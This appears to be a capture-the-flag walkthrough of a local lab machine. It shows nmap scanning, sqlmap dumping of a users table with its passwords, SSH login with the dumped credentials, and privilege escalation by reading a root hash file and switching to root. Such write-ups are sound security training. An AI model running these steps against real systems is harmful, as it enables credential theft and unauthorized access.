![image](https://github.com/user-attachments/assets/ca24b927-fd3b-4463-bd1f-83ff8f8ae5d6)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/15d9448f-ad52-44d6-b445-0e4cc1708e33)

```bash
whatweb 172.17.0.2
```
![image](https://github.com/user-attachments/assets/0b0201fe-2c6f-4987-8e17-c8c4ff88f0db)

## **We already have some information but in the meantime we will investigate the website**
![image](https://github.com/user-attachments/assets/cbd3cfd0-b9ef-4c4a-b22d-0abac22d0c00)
![image](https://github.com/user-attachments/assets/56104336-5156-430b-8376-de3b4db288b8)

## **As we can see in the web we have a place where we can log in so all these data must be stored in a database.**
```bash
sqlmap -u http://172.17.0.2/login.html --forms --dbs -batch
```
![image](https://github.com/user-attachments/assets/f25c86f5-d75b-4c33-a1c9-9d7bced7a6ce)

## **We are interested in the content of the user database.**
```bash
sqlmap -u http://172.17.0.2/login.html --forms  -D users --tables -batch
```
![image](https://github.com/user-attachments/assets/6dbbbe24-164e-4c8b-9bda-07feb9c2938c)

## **We need to know the content of that table.**
```bash
sqlmap -u http://172.17.0.2/login.html --forms  -D users -T usuarios -columns -batch
```
![image](https://github.com/user-attachments/assets/6ade3889-fc78-41f0-ae35-4876c3bc94a6)

## **We will list the contents of each column as follows.**
```bash
sqlmap -u http://172.17.0.2/login.html --forms  -D users -T usuarios -C id,username,password --dump -batch
```
![image](https://github.com/user-attachments/assets/946d0711-88ad-4ce2-8d7b-b42f5765b8fc)

## **we finally got users and passwords, now we will connect via SSH**
```bash
ssh pepe@172.17.0.2
```
![image](https://github.com/user-attachments/assets/99b395a2-193c-48e9-8403-c3dbdac6e608)

## **We will elevate privileges**
```bash
find / -perm -4000 2>/dev/null
```
![image](https://github.com/user-attachments/assets/166a94c8-dd87-4bb2-8f18-e9d9134046d1)
```bash
ls /root
```
![image](https://github.com/user-attachments/assets/559d7f0b-0c2f-400c-bb35-8789efee7c87)
```bash
grep '' /root/pass.hash
```
![image](https://github.com/user-attachments/assets/91754733-2dda-4069-8062-a4e4b1777de1)
![image](https://github.com/user-attachments/assets/dd5e6840-3e32-4538-99da-c8664f51ec75)
```bash
su root
```
![image](https://github.com/user-attachments/assets/9f181d0c-3a5c-4b73-a218-470f2a390409)
